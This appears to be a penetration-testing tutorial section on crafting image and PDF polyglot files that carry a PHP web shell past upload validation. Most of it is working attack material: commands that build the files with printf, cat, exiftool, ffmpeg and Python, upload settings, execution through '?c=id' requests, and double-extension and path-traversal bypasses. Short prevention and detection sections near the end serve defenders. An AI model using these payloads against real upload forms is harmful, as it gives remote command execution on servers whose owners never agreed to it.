# 2.1 Polyglot Advanced

## Goal

Create files that function as multiple file types simultaneously, passing both file type validation AND content validation while retaining executable code.

---

## What is a Polyglot File?

A polyglot file (also called multi-format file or polymorphic file) is a file that:
- ✅ Starts with valid magic bytes for one file type (e.g., GIF header)
- ✅ Contains executable code (e.g., PHP)
- ✅ Can be interpreted as both image AND code simultaneously

**Example:**
```
File: shell.php
Content:
GIF89a              ← Valid GIF header (magic bytes)
<?php system($_GET['c']); ?>  ← PHP code
```

Server sees: "This is a GIF" (via magic bytes check) ✓  
Server saves: shell.php  
Server executes: PHP code contained within ✓

---

## Why Polyglots Bypass Validation

```
Traditional defense layers:
1. Extension check: "Is it .php?" → FAIL (file.gif)
2. Magic byte check: "Valid GIF?" → PASS (GIF89a prefix)
3. Stored as: file.gif (image)
4. Execution: Can't execute image...

BUT with polyglot:
1. Extension check: "Is it .php?" → PASS (or .jpg.php with double ext)
2. Magic byte check: "Valid image?" → PASS (GIF89a header)
3. Stored as: shell.php (or shell.jpg)
4. Execution: PHP code in file executes ✓

Defense bypassed!
```

## The Core Polyglot Types

### Type 1: GIF + PHP Polyglot (EASIEST)

**Why GIF:**
- Simple magic bytes: `GIF89a` (6 bytes)
- GIF ignores data after palette
- PHP code after GIF header still interprets as PHP

**Creation Method 1: Simple Concatenation**

```bash
# Step 1: Create PHP payload
echo '<?php system($_GET["c"]); ?>' > payload.php

# Step 2: Create GIF header file
printf 'GIF89a' > gif_header.bin

# Step 3: Combine them
cat gif_header.bin payload.php > polyglot.gif.php
```

**How it works:**
```
File content (hexdump):
47 49 46 38 39 61        ← GIF89a (magic bytes)
3c 3f 70 68 70 ...       ← <?php... (PHP code)

When processed:
- Magic byte check: GIF89a ✓
- Extension .php: Executes as PHP ✓
```

**Payload:**
```php
<?php system($_GET['c']); ?>
```

**Upload:**
```
Filename: shell.gif.php  (or shell.php if extension check bypassed)
Content-Type: image/gif
File content: GIF89a<?php system($_GET['c']); ?>
```

**Access:**
```
GET /uploads/shell.gif.php?c=id
Response: uid=33(www-data) gid=33(www-data)...
```

---

### Type 2: JPEG + PHP Polyglot (MOST PRACTICAL)

**Why JPEG:**
- More common than GIF
- Magic bytes: `FF D8 FF E0` (4 bytes)
- Can embed PHP in EXIF data or after header

**Creation Method 1: Using ExifTool**

```bash
# Step 1: Have a valid JPEG
# (Or create one: just get any image from Google)

# Step 2: Inject PHP into EXIF data
exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg -o polyglot.jpg

# Step 3: Verify
exiftool polyglot.jpg
```

**How it works:**
```
JPEG structure:
[JPEG header] [EXIF data with PHP] [Image data]

When processed:
- Magic bytes check: Valid JPEG ✓
- Open as image: Works (displays, thumbnails, etc)
- If processed by PHP interpreter: PHP code executes ✓
```

**Creation Method 2: Binary Concatenation**

```bash
# Step 1: Create PHP code
php_code='<?php system($_GET["c"]); ?>'

# Step 2: Get valid JPEG magic bytes
# JPEG header: FF D8 FF E0 [size] JFIF
# Create minimal JPEG
printf '\xff\xd8\xff\xe0\x00\x10JFIF' > jpeg_header.bin

# Step 3: Combine
cat jpeg_header.bin > polyglot.jpg
echo "$php_code" >> polyglot.jpg

# Note: Real JPEG more complex, ExifTool is easier
```

**Better Method: Using FFmpeg**

```bash
ffmpeg -i image.jpg -c:v copy -metadata comment='<?php system($_GET["c"]); ?>' output.jpg
```

**Upload:**
```
Filename: shell.jpg (or shell.php)
Content-Type: image/jpeg
File: [JPEG data with PHP in EXIF]
```

---

### Type 3: PNG + PHP Polyglot

**Why PNG:**
- Magic bytes: `89 50 4E 47` (PNG in hex)
- Can embed data in PNG chunks
- Common for image upload

**Creation with ExifTool:**

```bash
exiftool -Comment='<?php system($_GET["c"]); ?>' image.png -o polyglot.png

# Or using ImageMagick
convert image.png -pointsize 20 -fill red text 0,0 '<?php system($_GET["c"]); ?>' output.png
```

**Creation with Python:**

```python
from PIL import Image
import piexif

# Load PNG
img = Image.open('image.png')

# Add PHP code to metadata
exif_dict = {"0th": {piexif.ImageIFD.Make: b"<?php system($_GET['c']); ?>"}}
exif_bytes = piexif.dump(exif_dict)

# Save
img.save('polyglot.png', exif=exif_bytes)
```

---

### Type 4: PDF + PHP Polyglot (ADVANCED)

**Why PDF:**
- Sometimes allowed for document uploads
- Can contain embedded files/scripts
- More complex but higher bounty if successful

**Creation:**

```bash
# PDF header
printf '%PDF-1.0\n' > polyglot.pdf

# Add PHP code
echo '<?php system($_GET["c"]); ?>' >> polyglot.pdf

# Add footer
echo '%%EOF' >> polyglot.pdf
```

**Complex PDF structure:**

```pdf
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R >>
endobj
<?php system($_GET['c']); ?>
%%EOF
```

**Note:** This is less reliable as it depends on server processing

## Advanced Polyglot Creation

### Technique 1: Hex-Level Magic Byte Positioning

**Concept:** Place PHP code right after valid magic bytes

```
Magic bytes for different formats:
GIF: 47 49 46 38 39 61 (GIF89a)
JPEG: FF D8 FF E0
PNG: 89 50 4E 47
BMP: 42 4D

Exploit: After magic bytes, put PHP
[magic bytes] <?php code ?>

GIF example:
47 49 46 38 39 61 3C 3F 70 68 70 ...
GIF89a       <?php...
```

**Using xxd (hex editor):**

```bash
# Create file
echo '<?php system($_GET["c"]); ?>' > code.txt

# Add GIF header using hex
(printf '\x47\x49\x46\x38\x39\x61'; cat code.txt) > polyglot.gif.php

# Verify
xxd polyglot.gif.php | head
# Output should start with: 47 49 46 38 39 61 (GIF89a)
```

---

### Technique 2: Using ImageMagick Delegate Commands

**Concept:** ImageMagick can embed text/code in images

```bash
# Create image with embedded PHP
convert -size 200x100 xc:white -font Arial -pointsize 20 \
  -draw 'text 10,50 "<?php system(\"id\"); ?>"' polyglot.jpg

# Or using text input
echo '<?php phpinfo(); ?>' | convert -size 100x100 xc:white \
  -pointsize 12 label:@- polyglot.jpg
```

---

### Technique 3: Metadata-Based Polyglots

**EXIF Injection (All Image Formats)**

```bash
# JPG
exiftool -UserComment='<?php system($_GET["c"]); ?>' image.jpg -o polyglot.jpg

# PNG
exiftool -Comment='<?php system($_GET["c"]); ?>' image.png -o polyglot.png

# GIF (limited metadata support)
exiftool -Comment='<?php system($_GET["c"]); ?>' image.gif -o polyglot.gif
```

**Verify metadata:**

```bash
exiftool polyglot.jpg | grep -i comment
# Should show your PHP code
```

## Testing Polyglots

### Step 1: Verify File Type

```bash
# Check magic bytes
xxd polyglot.jpg | head
# Should start with: ff d8 ff e0 (JPEG)

# Using file command
file polyglot.jpg
# Output: polyglot.jpg: JPEG image data

# Using identify (ImageMagick)
identify polyglot.jpg
# Output: polyglot.jpg JPEG 1920x1080 ...
```

### Step 2: Test Image Validity

```bash
# Try opening as image
# Should open successfully in any image viewer
# Should display as valid image

# Try converting to another format
convert polyglot.jpg test.png  # Should work

# Try creating thumbnail
convert -thumbnail 100x100 polyglot.jpg thumb.jpg  # Should work
```

### Step 3: Test PHP Execution

```bash
# Put file in web root
cp polyglot.jpg /var/www/html/

# Test via CLI
php /var/www/html/polyglot.jpg  # Should execute PHP

# Test via browser
curl http://localhost/polyglot.jpg?c=id
# Should show id command output
```

## Upload and Execution

### Upload Considerations

```
Filename: shell.jpg
Content-Type: image/jpeg
Magic bytes: Valid JPEG ✓
Extension: .jpg ✓
Content: JPEG + PHP code ✓

Server validation:
1. Extension check: "Is .jpg?" → PASS ✓
2. Magic byte check: "Valid JPEG?" → PASS ✓
3. MIME type: "image/jpeg?" → PASS ✓
4. Save: /uploads/shell.jpg
5. Access: http://site/uploads/shell.jpg
6. Execution: PHP in file executes ✓
```

### Execution Paths

**Direct PHP execution:**
```
If .jpg files are executed as PHP (misconfiguration):
- GET /uploads/shell.jpg?c=id
- Output: uid=33(www-data) gid=33(www-data)...
```

**Via upload rename:**
```
If upload renames to .php:
- Uploaded as: shell.jpg
- Stored as: shell.php
- GET /uploads/shell.php?c=id
- Output: Command executed
```

**Via language configuration:**
```
If PHP configured to execute images:
- .htaccess: AddType application/x-httpd-php .jpg
- GET /uploads/shell.jpg?c=id
- Output: PHP executes
```

## Real-World Examples

### Example 1: Polyglot + Content-Type Bypass

```
Vulnerability: Image upload with only magic byte check
Bypass: Upload polyglot JPEG with PHP code

File: polyglot.jpg (valid JPEG + PHP)
Content-Type: image/jpeg (spoofed)
Magic bytes: FF D8 FF E0 (valid JPEG)
Result:
1. Passes magic byte check ✓
2. Saved as polyglot.jpg
3. Server misconfigured to execute .jpg as PHP
4. Access: GET /uploads/polyglot.jpg?c=whoami
5. Output: www-data (RCE)
```

### Example 2: Polyglot + Double Extension

```
Vulnerability: Multiple validation failures

File: polyglot.php.jpg (GIF89a + PHP)
Content-Type: image/jpeg
Filename: shell.php.jpg (double extension)

Server processing:
1. Extension check: "Ends with .jpg?" → PASS ✓
2. Magic bytes: "GIF89a?" → PASS ✓
3. Saved as: shell.php.jpg
4. Apache config: AddType application/x-httpd-php .php
5. File processed as: PHP (due to .php in name)
6. Result: RCE
```

### Example 3: Polyglot + Path Traversal

```
Vulnerability: Polyglot + insufficient path sanitization

File: polyglot.jpg (valid image + PHP)
Filename: ../../shell.php.jpg
Content-Type: image/jpeg

Server:
1. Magic byte check passes (valid image)
2. Extension check: .jpg OK ✓
3. Path traversal: ../../ bypasses
4. Saved to: /var/www/shell.php.jpg
5. Accessed: http://site/shell.php.jpg?c=id
6. Result: RCE (if .php.jpg executed)
```

## Prevention (For Developers)

❌ **Bad:** Only check magic bytes

```php
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
if ($mime === 'image/jpeg') {
    move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);
}
// VULNERABLE: Doesn't validate actual image integrity
```

✅ **Good:** Validate and re-encode image

```php
// Validate image
$image = getimagesize($_FILES['file']['tmp_name']);
if ($image === false) {
    die("Not a valid image");
}

// Get actual MIME type
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
$allowed = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array($mime, $allowed)) {
    die("Invalid MIME type");
}

// RE-ENCODE image (removes embedded PHP!)
$new_image = imagecreatefromjpeg($_FILES['file']['tmp_name']);
imagejpeg($new_image, 'uploads/safe_image.jpg', 95);
imagedestroy($new_image);

// Now image is clean, no embedded code
```

✅ **Best:** Store outside web root

```php
// Validate image
$image = getimagesize($_FILES['file']['tmp_name']);
if ($image === false) die("Invalid image");

// Generate safe filename
$filename = uniqid() . '.jpg';

// STORE OUTSIDE WEB ROOT
$upload_dir = '/home/user/private_uploads/';  // NOT in /var/www/
move_uploaded_file($_FILES['file']['tmp_name'], $upload_dir . $filename);

// Serve via PHP (prevent direct execution)
// When user requests image, PHP script serves it:
// header('Content-Type: image/jpeg');
// readfile('/home/user/private_uploads/' . $filename);
```

## Detection Indicators

**Polyglot successful if:**
- ✅ Passes magic byte validation
- ✅ Opens as valid image
- ✅ Contains PHP code
- ✅ PHP code executes when accessed

**Detection tools:**

```bash
# Check if PHP code in image
strings polyglot.jpg | grep "<?php"

# Use exiftool
exiftool polyglot.jpg | grep -i "php\|comment"

# Check file type
file polyglot.jpg

# Hex analysis
xxd polyglot.jpg | grep "3c 3f 70 68 70"  # <?php in hex
```

## Troubleshooting

**Problem:** Polyglot doesn't open as image
- Solution: Create from valid image (don't create from scratch)
- Verify magic bytes with xxd

**Problem:** PHP code doesn't execute
- Solution: Try double extension .php.jpg
- Try uploading as .php directly
- Check server configuration

**Problem:** Image viewer shows corruption
- Solution: Extra data may corrupt image, use ExifTool instead of binary concat
- Re-encode image from valid source
